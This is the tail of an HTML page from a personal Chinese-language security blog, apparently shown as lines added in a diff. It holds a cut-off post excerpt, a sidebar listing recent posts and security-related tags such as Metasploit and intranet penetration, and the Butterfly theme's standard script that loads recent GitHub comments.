+指定要列出登录信息的计算机 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/#content-inner">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/#content-inner">7</a><a class="extend next" rel="next" href="/page/5/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Time</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/01/%E7%95%99%E8%A8%80%E6%9D%BF/" title="留言板"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="留言板"/></a><div class="content"><a class="title" href="/2022/01/01/%E7%95%99%E8%A8%80%E6%9D%BF/" title="留言板">留言板</a><time datetime="2021-12-31T22:50:08.000Z" title="发表于 2022-01-01 06:50:08">2022-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/02/%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B1%A0/" title="无题"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/11/02/%E4%BA%91%E5%87%BD%E6%95%B0%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86%E6%B1%A0/" title="无题">无题</a><time datetime="2021-11-02T01:47:44.101Z" title="发表于 2021-11-02 09:47:44">2021-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/14/Docker%E9%80%83%E9%80%B8/" title="无题"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/09/14/Docker%E9%80%83%E9%80%B8/" title="无题">无题</a><time datetime="2021-09-14T08:02:37.413Z" title="发表于 2021-09-14 16:02:37">2021-09-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/22/docker%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/" title="docker进阶学习(一)"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker进阶学习(一)"/></a><div class="content"><a class="title" href="/2021/07/22/docker%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/" title="docker进阶学习(一)">docker进阶学习(一)</a><time datetime="2021-07-22T13:26:34.000Z" title="发表于 2021-07-22 21:26:34">2021-07-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/19/HackTheBox-Oopsie-2/" title="HackTheBox-Oopsie-2"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox-Oopsie-2"/></a><div class="content"><a class="title" href="/2021/06/19/HackTheBox-Oopsie-2/" title="HackTheBox-Oopsie-2">HackTheBox-Oopsie-2</a><time datetime="2021-06-18T21:18:30.000Z" title="发表于 2021-06-19 05:18:30">2021-06-19</time></div></div></div></div><div class="card-widget" id="card-newest-comments"><div class="item-headline"><i class="fas fa-comment-dots"></i><span>最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/HTML/"><span class="card-category-list-name">HTML</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/HackTheBox/"><span class="card-category-list-name">HackTheBox</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Java/"><span class="card-category-list-name">Java</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="card-category-list-name">SQL注入</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/SRC/"><span class="card-category-list-name">SRC</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WAF/"><span class="card-category-list-name">WAF</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/WEB%E4%B9%8B%E5%9B%B0/"><span class="card-category-list-name">WEB之困</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/docker/"><span class="card-category-list-name">docker</span><span class="card-category-list-count">7</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Compose/" style="font-size: 1.1em; color: #999">Compose</a> <a href="/tags/HackTheBox/" style="font-size: 1.2em; color: #999da3">HackTheBox</a> <a href="/tags/JAVA/" style="font-size: 1.3em; color: #99a1ac">JAVA</a> <a href="/tags/Metasploit/" style="font-size: 1.1em; color: #999">Metasploit</a> <a href="/tags/Swarm%E3%80%81%E9%9B%86%E7%BE%A4/" style="font-size: 1.1em; color: #999">Swarm、集群</a> <a href="/tags/Thinkphp/" style="font-size: 1.1em; color: #999">Thinkphp</a> <a href="/tags/WAF/" style="font-size: 1.1em; color: #999">WAF</a> <a href="/tags/WAF%E7%89%B9%E6%80%A7/" style="font-size: 1.1em; color: #999">WAF特性</a> <a href="/tags/docker/" style="font-size: 1.1em; color: #999">docker</a> <a href="/tags/docker%E5%9F%BA%E7%A1%80/" style="font-size: 1.1em; color: #999">docker基础</a> <a href="/tags/docker%E7%BD%91%E7%BB%9C/" style="font-size: 1.1em; color: #999">docker网络</a> <a href="/tags/mysql/" style="font-size: 1.2em; color: #999da3">mysql</a> <a href="/tags/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/" style="font-size: 1.1em; color: #999">业务安全</a> <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 1.2em; color: #999da3">中间件</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 1.1em; color: #999">代码审计，学习笔记</a> <a href="/tags/%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92/" style="font-size: 1.1em; color: #999">会话传递</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.4em; color: #99a5b6">内网渗透</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 1.1em; color: #999">协议</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size: 1.1em; color: #999">反编译</a> <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" style="font-size: 1.1em; color: #999">后渗透工具</a> <a href="/tags/%E5%97%85%E6%8E%A2/" style="font-size: 1.1em; color: #999">嗅探</a> <a href="/tags/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.2em; color: #999da3">域内信息收集</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 1.4em; color: #99a5b6">学习笔记</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">审计学习</a> <a href="/tags/%E5%AE%B9%E5%99%A8%E6%95%B0%E6%8D%AE%E5%8D%B7-Dockerfile/" style="font-size: 1.1em; color: #999">容器数据卷,Dockerfile</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.1em; color: #999">工具</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.1em; color: #999">数据库</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.2em; color: #999da3">漏洞复现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%EF%BC%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 1.1em; color: #999">漏洞靶场，学习笔记</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.1em; color: #999">环境搭建</a> <a href="/tags/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/" style="font-size: 1.1em; color: #999">被动扫描</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 1.2em; color: #999da3">随笔</a> <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" style="font-size: 1.5em; color: #99a9bf">靶场实战</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/01/"><span class="card-archive-list-date">一月 2022</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/11/"><span class="card-archive-list-date">十一月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/09/"><span class="card-archive-list-date">九月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/07/"><span class="card-archive-list-date">七月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/06/"><span class="card-archive-list-date">六月 2021</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/02/"><span class="card-archive-list-date">二月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/01/"><span class="card-archive-list-date">一月 2021</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/12/"><span class="card-archive-list-date">十二月 2020</span><span class="card-archive-list-count">2</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">69</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-12-31T23:21:22.523Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By Time</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://timeshu.github.io">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script>window.addEventListener('load', () => {
+  const changeContent = (content) => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const findTrueUrl = (array) => {
+    Promise.all(array.map(item =>
+      fetch(item.url).then(resp => resp.json()).then(data => {
+        const urlArray = data.body.match(/(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?/ig)
+        if (data.user.login === 'utterances-bot') {
+          return urlArray.pop()
+        } else {
+          return urlArray.shift()
+        }
+      })
+    )).then(res => {
+        array = array.map((i,index)=> {
+          return {
+            ...i,
+            url: res[index]
+          }
+        })
+
+        saveToLocal.set('github-newest-comments', JSON.stringify(array), 10/(60*24))
+        generateHtml(array)
+    });
+  }
+
+  const getComment = () => {
+    fetch('https://api.github.com/repos/Time/timeshu.github.io/issues/comments?sort=updated&direction=desc&per_page=6&page=1',{
+      "headers": {
+        Accept: 'application/vnd.github.v3.html+json'
+      }
+    })
+      .then(response => response.json())
+      .then(data => {
+        const githubArray = data.map(item => {
+          return {
+            'avatar': item.user.avatar_url,
+            'content': changeContent(item.body_html),
+            'nick': item.user.login,
+            'url': item.issue_url,
+            'date': item.updated_at,
+            'githubUrl': item.html_url
+          }
+        })
+        findTrueUrl(githubArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
+      })
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('github-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
